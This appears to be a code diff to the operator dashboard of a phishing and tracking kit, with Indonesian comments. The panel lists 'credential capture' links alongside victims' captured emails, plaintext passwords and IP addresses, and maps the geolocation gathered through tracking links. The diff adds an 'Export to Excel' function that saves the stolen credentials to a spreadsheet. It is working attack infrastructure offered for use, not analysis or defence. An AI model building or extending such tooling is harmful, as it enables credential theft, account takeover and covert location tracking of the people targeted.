@@ -3,12 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>:: HACKER-UI DASHBOARD v6.8 (Final) ::</title>
+    <title>:: HACKER-UI DASHBOARD v7.0 (Final) ::</title>
     <link rel="stylesheet" href="style.css">
     <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
     <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/qrcodejs@1.0.0/qrcode.min.js"></script>
+    <script src="https://cdn.sheetjs.com/xlsx-latest/package/dist/xlsx.full.min.js"></script>
     <style>
         #map { height: 450px; width: 100%; }
         .leaflet-control-layers { background: rgba(0,0,0,0.8); border: 1px solid #00ff41; }
@@ -22,6 +23,7 @@
         #qr-code-container img { width: 100% !important; height: auto !important; }
         .feature-panel { border: 1px solid #00ffff; padding: 20px; margin-top: 20px; background-color: rgba(0, 255, 255, 0.05); box-shadow: 0 0 10px #00ffff inset; }
         .feature-panel h2 { text-align: center; color: #00ffff; text-shadow: 0 0 8px #00ffff; border-bottom: 1px solid #00ffff; padding-bottom: 10px; margin-top: 0; }
+        .table-header-actions { display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px; }
     </style>
 </head>
 <body>
@@ -82,8 +84,11 @@
             <hr style="border-color: #00ffff; margin-top: 10px;">
             <div id="location-links-section"><p class="highlight">> Awaiting data...</p></div>
 
-            <h1 class="main-title" style="margin-top: 30px;">> CREDENTIALS_LINKS_AND_LOGS.DAT</h1>
-            <hr style="border-color: #ff4141; margin-top: 10px;">
+            <div class="table-header-actions">
+                <h1 class="main-title" style="margin-top: 30px; border-bottom: none;">> CREDENTIALS_LINKS_AND_LOGS.DAT</h1>
+                <button id="export-excel-btn" class="hacker-button small">[ EXPORT TO EXCEL ]</button>
+            </div>
+            <hr style="border-color: #ff4141; margin-top: 0;">
             <div id="merged-credentials-section"><p class="highlight">> Awaiting data...</p></div>
             
             <div id="map-modal" class="modal">
@@ -131,11 +136,13 @@
         const notificationSound = document.getElementById('notification-sound');
         const modal = document.getElementById('map-modal'), modalTitle = document.getElementById('modal-title'), closeBtn = document.querySelector('.close-btn'), mapActionsDiv = document.getElementById('map-actions');
         const qrModal = document.getElementById('qr-code-modal'), qrCloseBtn = document.getElementById('qr-close-btn'), qrContainer = document.getElementById('qr-code-container'), qrDownloadLink = document.getElementById('qr-download-link');
+        const exportExcelBtn = document.getElementById('export-excel-btn');
         let topLinksChart, browserChart, map, markersLayer, realtimeMap, realtimeMarkersLayer, isAudioEnabled = false, qrcode = null;
         
         let currentCredentialCount = 0;
         let isInitialLoad = true;
-        
+        let lastCredentialsData = [];
+
         function showNotification(message, icon = '💀') {
             if (notificationSound.dataset.enabled === "true") {
                 notificationSound.currentTime = 0;
@@ -179,6 +186,29 @@
         window.addEventListener('click', (event) => { if (event.target == qrModal) { qrModal.style.display = "none"; } if (event.target == modal) { modal.style.display = "none"; } });
         advancedToggle.addEventListener('click', (e) => { e.preventDefault(); const isHidden = advancedOptions.style.display === 'none'; advancedOptions.style.display = isHidden ? 'block' : 'none'; e.target.textContent = isHidden ? '[ - Advanced Options ]' : '[ + Advanced Options ]'; });
 
+        function exportToExcel() {
+            if (lastCredentialsData.length === 0) {
+                alert("No credential data to export.");
+                return;
+            }
+            const dataToExport = lastCredentialsData.map(cred => ({
+                'Timestamp': new Date(cred.event_time).toLocaleString('id-ID'),
+                'Link ID': cred.id,
+                'Target ID': cred.username,
+                'Email': cred.email,
+                'Password': cred.password,
+                'IP Address': cred.ip_address,
+                'Status': (cred.expires_at && new Date(cred.expires_at) < new Date()) ? 'EXPIRED' : 'ACTIVE'
+            }));
+            const worksheet = XLSX.utils.json_to_sheet(dataToExport);
+            const workbook = XLSX.utils.book_new();
+            XLSX.utils.book_append_sheet(workbook, worksheet, "Credentials");
+            worksheet["!cols"] = [ { wch: 20 }, { wch: 15 }, { wch: 15 }, { wch: 25 }, { wch: 25 }, { wch: 18 }, { wch: 10 } ];
+            const timestamp = new Date().toISOString().slice(0, 19).replace(/:/g, "-");
+            XLSX.writeFile(workbook, `credentials_log_${timestamp}.xlsx`);
+        }
+        exportExcelBtn.addEventListener('click', exportToExcel);
+
         function renderLocationLinksTable(links = []) {
             const locationLinks = links.filter(link => link.link_type === 'direct');
             if (locationLinks.length === 0) {
@@ -206,9 +236,9 @@
         
         function renderMergedCredentialsTable(links = [], credentials = []) {
             const credentialLinks = links.filter(link => link.link_type === 'intermediate');
-
             if (credentialLinks.length === 0) {
                 mergedCredentialsSection.innerHTML = "<p class='error'>> NO CREDENTIAL CAPTURE LINKS CREATED.</p>";
+                lastCredentialsData = [];
                 return;
             }
 
@@ -220,21 +250,26 @@
                 }
                 credentialsMap.get(cred.tracker_id).push(cred);
             }
-
+            
+            let validCredentialsForExport = [];
             for (const link of credentialLinks) {
                 const capturedCreds = credentialsMap.get(link.id);
                 if (capturedCreds && capturedCreds.length > 0) {
                     for (const cred of capturedCreds) {
-                        mergedData.push({ ...link, email: cred.email, password: cred.password, ip_address: cred.ip_address, event_time: cred.created_at });
+                        const mergedEntry = { ...link, email: cred.email, password: cred.password, ip_address: cred.ip_address, event_time: cred.created_at };
+                        mergedData.push(mergedEntry);
+                        validCredentialsForExport.push(mergedEntry);
                     }
                 } else {
                     mergedData.push({ ...link, email: 'N/A', password: 'N/A', ip_address: 'N/A', event_time: link.created_at });
                 }
             }
-
+            
+            lastCredentialsData = validCredentialsForExport;
             mergedData.sort((a, b) => new Date(b.event_time) - new Date(a.event_time));
 
-            let html = `<table class="hacker-table"><thead><tr><th>Timestamp</th><th>Link ID</th><th>Target ID</th><th>Clicks</th><th>Email</th><th>Password</th><th>Status</th><th>Aksi</th></tr></thead><tbody>`;
+            // ==== PERUBAHAN DI SINI: Menghapus <th>Clicks</th> dan <td> terkait ====
+            let html = `<table class="hacker-table"><thead><tr><th>Timestamp</th><th>Link ID</th><th>Target ID</th><th>Email</th><th>Password</th><th>Status</th><th>Aksi</th></tr></thead><tbody>`;
             mergedData.forEach(r => {
                 const linkUrl = `${window.location.protocol}//${window.location.host}/${r.id}`;
                 const isExpired = r.expires_at && new Date(r.expires_at) < new Date();
@@ -247,7 +282,6 @@
                     <td>${new Date(r.event_time).toLocaleString('id-ID')}</td>
                     <td><a href="${linkUrl}" target="_blank">${r.id}</a></td>
                     <td class="highlight">${r.username}</td>
-                    <td class="highlight">${r.click_count}</td>
                     <td class="highlight">${r.email}</td>
                     <td class="highlight">${r.password}</td>
                     <td class="${statusClass}">${statusText}</td>
@@ -284,7 +318,7 @@
                             markersLayer.addLayer(marker);
                         });
                         const latestLocation = validLocations[0];
-                        const googleMapsUrl = `http://googleusercontent.com/maps.google.com/9{latestLocation.latitude},${latestLocation.longitude}`;
+                        const googleMapsUrl = `https://www.google.com/maps?q=${latestLocation.latitude},${latestLocation.longitude}`;
                         mapActionsDiv.innerHTML = `<a href="${googleMapsUrl}" target="_blank" class="hacker-button">[ VIEW MORE DETAILS ON GOOGLE MAPS ]</a>`;
                         map.fitBounds(markersLayer.getBounds());
                     } else {
